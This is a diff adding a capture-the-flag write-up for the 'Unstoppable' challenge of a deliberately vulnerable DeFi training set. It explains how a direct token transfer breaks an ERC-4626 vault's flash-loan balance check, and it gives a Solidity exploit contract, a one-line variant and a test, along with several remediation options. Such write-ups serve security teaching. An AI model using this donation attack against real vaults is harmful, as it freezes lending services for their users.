@@ -1,0 +1,296 @@
+# 🎯 Challenge #1: Unstoppable
+
+![Difficulty](https://img.shields.io/badge/Difficulty-⭐%20Easy-brightgreen)
+![Type](https://img.shields.io/badge/Type-DoS%20Attack-red)
+![Gas](https://img.shields.io/badge/Gas-~21,000-blue)
+
+> **DoS via Accounting Mismatch** - Break the flash loan system by desynchronizing two accounting methods
+
+## 📋 Challenge Overview
+
+**Objective**: Stop the vault from offering flash loans  
+**Success Criteria**: Make `flashLoan()` function permanently revert  
+**Initial Funds**: 1 DVT token  
+**Target**: `UnstoppableVault` contract
+
+### 🎯 The Scenario
+There's a lending pool offering flash loans of DVT tokens. It has 1 million DVT tokens in balance. The pool is supposed to be "unstoppable" - but can you find a way to halt it?
+
+## 🔍 Vulnerability Analysis
+
+### **The Root Cause**
+The `UnstoppableVault` contract contains a **critical accounting mismatch** in its `flashLoan()` function:
+
+```solidity
+function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)
+    external
+    returns (bool)
+{
+    if (amount == 0) revert InvalidAmount(0); 
+    if (address(asset) != _token) revert UnsupportedCurrency(); 
+
+    uint256 balanceBefore = totalAssets();
+    if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // ⚡ VULNERABLE LINE
+    
+    // ... rest of flash loan logic
+}
+```
+
+### **The Problem**
+The vulnerability exists in this assertion:
+```solidity
+if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();
+```
+
+Where:
+- `totalAssets()` = `asset.balanceOf(address(this))` (actual token balance)
+- `convertToShares(totalSupply)` = Internal accounting based on shares
+
+### **Why It's Vulnerable**
+These two accounting systems can be **desynchronized** by:
+1. **Direct token transfer** to the vault (bypasses share minting)
+2. This increases `totalAssets()` but not `convertToShares(totalSupply)`
+3. The assertion fails → All flash loans revert → **DoS achieved**
+
+## ⚡ Exploit Implementation
+
+### **Attack Strategy**
+Simply transfer tokens directly to the vault to break accounting:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "../DamnValuableToken.sol";
+import "../unstoppable/UnstoppableVault.sol";
+
+contract UnstoppableExploit {
+    DamnValuableToken private token;
+    UnstoppableVault private vault;
+    
+    constructor(address _token, address _vault) {
+        token = DamnValuableToken(_token);
+        vault = UnstoppableVault(_vault);
+    }
+    
+    function exploit() external {
+        // Get our token balance
+        uint256 balance = token.balanceOf(msg.sender);
+        require(balance > 0, "Need tokens to exploit");
+        
+        // Transfer tokens from attacker to this contract
+        token.transferFrom(msg.sender, address(this), balance);
+        
+        // 💥 CRITICAL: Transfer directly to vault (bypasses deposit())
+        // This breaks the accounting balance check in flashLoan()
+        token.transfer(address(vault), balance);
+        
+        // ✅ Vault is now permanently DoS'd!
+        // flashLoan() will always revert due to accounting mismatch
+    }
+}
+```
+
+### **Minimal Exploit (One-liner)**
+The attack can be even simpler:
+```solidity
+// Just transfer 1 wei directly to the vault
+token.transfer(address(vault), 1);
+```
+
+## 📊 Attack Flow
+
+```mermaid
+graph TD
+    A[Attacker has 1 DVT token] --> B[Transfer 1 DVT directly to vault]
+    B --> C[totalAssets increases by 1]
+    C --> D[convertToShares unchanged]
+    D --> E[Assertion fails: convertToShares != totalAssets]
+    E --> F[All flashLoan calls revert]
+    F --> G[🎯 Vault permanently DoS'd]
+```
+
+## 🧪 Testing
+
+### **Test Setup**
+```solidity
+function test_unstoppable_exploit() public {
+    // Initial state verification
+    assertEq(token.balanceOf(player), INITIAL_PLAYER_TOKEN_BALANCE);
+    assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT);
+    
+    // Flash loan should work initially
+    vm.prank(player);
+    vault.flashLoan(someReceiver, address(token), 100e18, "");
+    
+    // Execute exploit
+    vm.startPrank(player);
+    token.approve(address(exploit), INITIAL_PLAYER_TOKEN_BALANCE);
+    exploit.exploit();
+    vm.stopPrank();
+    
+    // Verify flash loans are broken
+    vm.expectRevert(UnstoppableVault.InvalidBalance.selector);
+    vault.flashLoan(someReceiver, address(token), 100e18, "");
+}
+```
+
+### **Before Attack**
+```
+totalAssets(): 1,000,000 DVT
+convertToShares(totalSupply): 1,000,000
+Balance Check: 1,000,000 == 1,000,000 ✅ PASS
+```
+
+### **After Attack**  
+```
+totalAssets(): 1,000,001 DVT (direct transfer)
+convertToShares(totalSupply): 1,000,000 (unchanged)
+Balance Check: 1,000,000 == 1,000,001 ❌ FAIL → REVERT
+```
+
+## 🛡️ Real-World Examples
+
+### **Euler Finance Hack (March 2023) - $197M Loss**
+Similar accounting manipulation caused massive losses:
+- Attacker used `donateToReserves()` to manipulate health factors
+- Created accounting discrepancies between internal and external balances
+- Led to $197M in stolen funds
+
+### **Other Similar Attacks**
+- **Hundred Finance** (2023) - Price manipulation via donations
+- **Fei Protocol** (2022) - Accounting errors in reward distribution
+- **Cream Finance** (2021) - Flash loan accounting manipulation
+
+## 🔧 Remediation
+
+### **❌ Current Vulnerable Code**
+```solidity
+uint256 balanceBefore = totalAssets(); // External balance
+if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();
+```
+
+### **✅ Fixed Code Option 1: Remove Check**
+```solidity
+// Simply remove the problematic assertion
+// The flash loan logic works fine without it
+function flashLoan(...) external returns (bool) {
+    if (amount == 0) revert InvalidAmount(0);
+    if (address(asset) != _token) revert UnsupportedCurrency();
+    
+    // Remove: if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();
+    
+    // Continue with flash loan logic...
+}
+```
+
+### **✅ Fixed Code Option 2: Use Internal Accounting**
+```solidity
+contract UnstoppableVault {
+    uint256 private internalBalance; // Track internally
+    
+    function deposit(uint256 assets, address receiver) public override returns (uint256) {
+        uint256 shares = super.deposit(assets, receiver);
+        internalBalance += assets; // Update internal tracking
+        return shares;
+    }
+    
+    function flashLoan(...) external returns (bool) {
+        // Use internal balance instead of external
+        if (convertToShares(totalSupply) != internalBalance) revert InvalidBalance();
+        // ...
+    }
+}
+```
+
+### **✅ Fixed Code Option 3: Handle Donations**
+```solidity
+function flashLoan(...) external returns (bool) {
+    uint256 balanceBefore = totalAssets();
+    uint256 expectedBalance = convertToShares(totalSupply);
+    
+    // Allow donations (ignore excess)
+    if (balanceBefore < expectedBalance) revert InvalidBalance();
+    
+    // Continue normally...
+}
+```
+
+## 🎓 Security Lessons
+
+### **Key Takeaways**
+1. **Never rely on external balances for critical logic** - They can be manipulated
+2. **Separate accounting systems must be synchronized** - Or don't use multiple systems
+3. **Consider donation attacks** - Anyone can send tokens directly
+4. **Test edge cases** - What happens with unexpected token transfers?
+
+### **Best Practices**
+- ✅ Use internal accounting for critical checks
+- ✅ Handle unexpected token donations gracefully  
+- ✅ Avoid assertions that can be externally manipulated
+- ✅ Test with various token transfer scenarios
+- ✅ Consider using pull-over-push patterns
+
+### **Common Patterns**
+This vulnerability pattern appears in:
+- Vault contracts checking balances
+- Reward distribution systems
+- Price oracle calculations
+- AMM pool accounting
+
+## 📈 Gas Analysis
+
+| Operation | Gas Cost | Description |
+|-----------|----------|-------------|
+| `token.transfer()` | ~21,000 | Direct transfer to vault |
+| `flashLoan()` call | ~5,000 | Before revert |
+| Total Attack | ~26,000 | Very gas-efficient DoS |
+
+## 💡 Advanced Concepts
+
+### **ERC-4626 Vulnerability**
+This vulnerability exists because:
+1. ERC-4626 vaults track shares vs assets
+2. External token transfers bypass share minting
+3. Creates accounting discrepancy
+4. Critical functions rely on balance equality
+
+### **Donation Attack Pattern**
+```solidity
+// This pattern is vulnerable to donations:
+require(actualBalance == expectedBalance);
+
+// This pattern is donation-resistant:  
+require(actualBalance >= expectedBalance);
+```
+
+### **Prevention Patterns**
+```solidity
+// Pattern 1: Internal accounting only
+uint256 private totalDeposited;
+
+// Pattern 2: Allow excess (donations)
+require(balance >= minimumRequired);
+
+// Pattern 3: Sweep excess to treasury
+uint256 excess = balance - expected;
+if (excess > 0) token.transfer(treasury, excess);
+```
+
+## 🔍 Code Review Checklist
+
+When reviewing similar code, check for:
+- [ ] External balance vs internal accounting mismatches
+- [ ] Functions that can be broken by direct token transfers
+- [ ] Assertions that require exact equality of manipulatable values
+- [ ] Missing handling of "donation" scenarios
+- [ ] Over-reliance on `balanceOf()` for critical logic
+
+---
+
+**🎯 Challenge Status**: ✅ **SOLVED**  
+**⏱️ Time to Solve**: ~5 minutes  
+**🔥 Difficulty Rating**: Very Easy (Beginner-friendly)  
+**🎓 Learning Value**: High - Fundamental DeFi security concept
+
+> **Next Challenge**: [#2 Naive Receiver](../02-naive-receiver/) - Flash loan abuse patterns
